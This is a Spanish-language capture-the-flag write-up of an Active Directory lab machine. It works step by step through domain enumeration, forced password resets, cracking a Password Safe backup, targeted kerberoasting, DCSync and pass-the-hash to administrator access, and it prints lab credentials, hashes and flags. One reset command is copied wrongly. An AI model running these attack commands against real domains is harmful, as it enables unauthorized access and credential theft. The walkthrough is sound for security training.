![[Administrator.png]]

Pentest interno, por lo que comenzamos teniendo credenciales:
Olivia : ichliebedich

``sudo nmap 10.10.11.42 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``
![[Pasted image 20250407124206.png]]

``nmap 10.10.11.42 -sCV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,54343,57656,57667,57672,57675,57694 -oN target``
![[Pasted image 20250407124352.png]]

netexec
![[Pasted image 20250407124155.png]]
Dominio -> administrator.htb
Máquina: Dc

-> /etc/hosts
![[Pasted image 20250407124311.png]]

Como tenemos credenciales válidas a nivel de dominio, vamos a intentar enumerar el resto de usuarios:

``rpcclient -U 'olivia%ichliebedich' 10.10.11.42 -c 'enumdomusers' ``
-> enumdomusers
![[Pasted image 20250407124641.png]]

Vamos a guardarnos el output para posteriormente hacer un tratamiento a los datos y quedarnos con los nombres de usuario.

``cat rpcusers.txt | cut -d '[' -f2 | cut -d ']' -f1 > users.txt; cat users.txt``
![[Pasted image 20250407124954.png]]

Vamos a seguir enumerando. Como tiene servidor DNS, podemos hacer uso de la herramienta bloodhound-python para enumerar el dominio proporcionando credenciales desde fuera del mismo.

- Levantamos neo4j
``sudo neo4j start``
![[Pasted image 20250407125334.png]]

- Levantamos bloodhound
``bloodhound --no-sandbox &>/dev/null & disown``

- Introducimos nuestras credenciales de neo4j.

- Enumeramos el dominio con bloodhound:
`` bloodhound-python -u 'olivia' -p 'ichliebedich' -d administrator.htb -c all -ns 10.10.11.42``
![[Pasted image 20250407125531.png]]

- Subimos los .json proporcionados por la enumeración de bloodhound-python a la base de datos.


- Marcamos como owned al usuario olivia (pues tenemos sus credenciales)

Si observamos desde bloodhound, el usuario Olivia tiene GenericAll sobre el usuario Michael.

![[Pasted image 20250407125924.png]]
![[Pasted image 20250407125933.png]]
Entre otras cosas, lo que podemos hacer es cambiar su contraseña.

->

``net rpc password michael -U 'olivia' -S 10.10.11.42``
-> Introducimos nueva contraseña para michael: test123!
-> Introducimos la contraseña de olivia
![[Pasted image 20250407133757.png]]

- Comprobamos que efectivamente se ha cambiado la contraseña de michael:
``netexec smb 10.10.11.42 -u 'michael' -p 'test123!'``

![[Pasted image 20250407133851.png]]

Forma parte del grupo RemoteManagementUse (winrm)?
![[Pasted image 20250407133932.png]]

Podemos entrar en el sistema tanto con olivia como michael.
Si seguimos enumerando con michael, vemos que podemos forzar el cambio de contraseña de Benjamin:

![[Pasted image 20250407134117.png]]

![[Pasted image 20250407134059.png]]

Realizamos lo mismo que hicimos anteriormente para cambiar al contraseña de Michael, pero en este caso para Benjamin.

``net rpc password michael -U 'olivia' -S 10.10.11.42``
-> Introducimos nueva contraseña para benjamin: test123!
-> Introducimos la contraseña de michael
![[Pasted image 20250407134221.png]]

Validamos las credenciales:
`netexec smb 10.10.11.42 -u 'michael' -p 'test123!'``
![[Pasted image 20250407134257.png]]

Pero no forma parte del grupo Remote Management User, por lo que no puede conectarse por winrm.

Credenciales hasta ahora:
- olivia : ichliebedich
- michael : test123!
- benjamin : test123!

Con el usuario benjamin podemos loguearnos por ftp:

![[Pasted image 20250407134718.png]]

``ftp 10.10.11.42``
![[Pasted image 20250407134740.png]]

Nos el archivo Backup.psafe3 a la máquina víctima:
``get Backup.psafe3``
![[Pasted image 20250407134834.png]]

Podría decirse que se parece a Keepass, es decir, parecido a un archivo kdbx que permite gestionar contraseñas teniendo una contraseña maestra.

Si hacemos un file del archivo:
``file Backup.psafe3``
![[Pasted image 20250407144952.png]]

Según google:
``Los archivos PSAFE3 pertenecen principalmente a Password Safe. Password Safe le permite crear de forma segura y sencilla una lista segura y encriptada de nombres de usuario/contraseñas. Con Password Safe todo lo que tiene que hacer es crear y recordar una única contraseña maestra de su elección para desbloquear y acceder a toda su lista de nombres de usuario/contraseñas.``

Si investigamos un poco, vemos que hashcat tiene un código interno para intentar crackear

``hashcat --help | grep -i 'password safe'``
![[Pasted image 20250407142923.png]]
5200

Una vez sabemos el código interno de hashcat para PasswordSafev3, lanzamos hashcat con rockyou:

``hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockou.txt --force``
![[Pasted image 20250407144805.png]]


Otra opción habría sido pasarle el archivo Backup.psafe3 a pwsafe2john (similar a zip2john o ssh2john), lo que generaría un archivo que john sí puede intentar crackear.

Saca tekieromucho como contraseña maestra. Esto puede cuadrarnos ya que "ichliebedich" significa exactamente "te quiero mucho" en castellano.

Si miramos un poco la documentación de pwsafe:
https://pwsafe.org/help/pwsafeEN/html/cli.html

Tenemos que hacer uso de  la herramienta pwsafe. Si no la tenemos: ``sudo apt install pwsafe``
Una vez tenemos la herramienta:

``pwsafe Backup.psafe3``
Esto nos abre de forma gráfica una especie de panel de autenticación que nos pide la contraseña maestra / combinación segura:
![[Pasted image 20250407145359.png]]

Probamos con tekieromucho. Funciona:

![[Pasted image 20250407145421.png]]

Haciendo doble click sobre cualquiera de ellos nos copiará su  contraseña.

alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur

Añadimos estas contraseña a pass.txt (junto con las dos que teníamos antes: la contraseña inicial y la contraseña que hemos cambiado para los dos usuarios que podíamos):

![[Pasted image 20250407145637.png]]

-> netexec para validar
``netexec smb 10.10.11.42 -u users.txt -p pass.txt --continue-on-success``

Nos confirma cosas que ya sabíamos:

![[Pasted image 20250407145747.png]]
![[Pasted image 20250407145758.png]]

Pero también nos confirma algo nuevo:
![[Pasted image 20250407145828.png]]
emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Son credenciales válidas de dominio.

Hasta ahora tenemos:
 ![[Pasted image 20250407145929.png]]
 
A su vez, vamos a ver si emily puede hacer uso de winrm:
![[Pasted image 20250407150125.png]]

Podemos hacer uso, por lo que nos conectamos:

``evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'``

En C:\Users\emily\Desktop encontramos la flag de usuario.

![[Pasted image 20250407150316.png]]

user.txt = 20ce467467094b17403782e9f2e202fa

# PRIVESC

Vamos a bloodhound y marcamos emily como usuario owned y vamos a ver qué podemos hacer desde ahí:

![[Pasted image 20250407150521.png]]

![[Pasted image 20250407150537.png]]


Como emily tenemos GenericWrite sobre ethan:
https://www.hackingarticles.in/abusing-ad-dacl-genericwrite/

Lo que se va a hacer es añadir un SPN (ServicePrincipalName) a la cuenta de usuario objetivo. Desde el momento que la cuenta tiene un SPN, es vulnerable a kerberoasting. Esta técnica se llama "targeted kerberoasting"

Si lanzamos directamente targetedKerberoast.py da problema por desincronización de reloj.

-> Primero tenemos que sincronizar el reloj, que ha costado conseguirlo para el ejemplo por problemas de reloj.
```
sudo timedatectl set-ntp off
sudo rdate -n IPobjetivo
```

Una vez está sincronizado (desde sudo), lo corremos:
``sudo python3 targetedKerberoast.py -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'``

Curiosamente con --dc-ip 10.10.11.42 daba error. Sin ello no.

![[Pasted image 20250407174254.png]]
![[Pasted image 20250407174305.png]]
![[Pasted image 20250407174323.png]]
-> Nos saca el hash y por tanto podemos intentar crackear.

A su vez, podemos volver a setear en on:
``sudo timedatectl set-ntp on``


-> Le pasamos el hash a hashcat:
``hashcat -m 13100 ethankerberoasthash /usr/share/wordlists/rockyou.txt --force``
![[Pasted image 20250407175039.png]]

hash = limpbizkit
Tenemos la contraseña del usuario ethan.

Validamos credenciales de ethan:
``netexec smb 10.10.11.42 -u ethan -p 'limpbizkit'``
![[Pasted image 20250407175340.png]]

ethan : limpbizkit son credenciales válidas.

Marcamos como owned a Ethan en el BloodHound.
Si observamos:
![[Pasted image 20250407175725.png]]

Podemos hacer DCSync con Ethan, por lo que podemos ver todos los hashes NTLM de los usuarios del dominio.

``impacket-secretsdump DC=administrator,DC=htb/'ethan':'limpbizkit'@'10.10.11.42'``

![[Pasted image 20250407175925.png]]

Cogemos el hash NTLM de Administrator (3dc553ce4b9fd20bd016e098d2d2fd2e -> hash.txt) y se lo pasamos a hashcat:

``hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt --force``
Pero no consigue romperlo. No obstante, no importa porque podemos hacer PassTheHash:

``netexec smb 10.10.11.42 -u Administrator -H ':3dc553ce4b9fd20bd016e098d2d2fd2e'``
![[Pasted image 20250407184233.png]]

Por lo tanto, podemos hacer uso de psexec, wmiexec.
``impacket-psexec administrator@10.10.11.42 -hashes ':3dc553ce4b9fd20bd016e098d2d2fd2e'``
![[Pasted image 20250407184431.png]]

En C:\Users\Administrator\Desktop recogemos la flag de root.txt
![[Pasted image 20250407184548.png]]

root.txt = 44903097c386521b812e00d27787d848



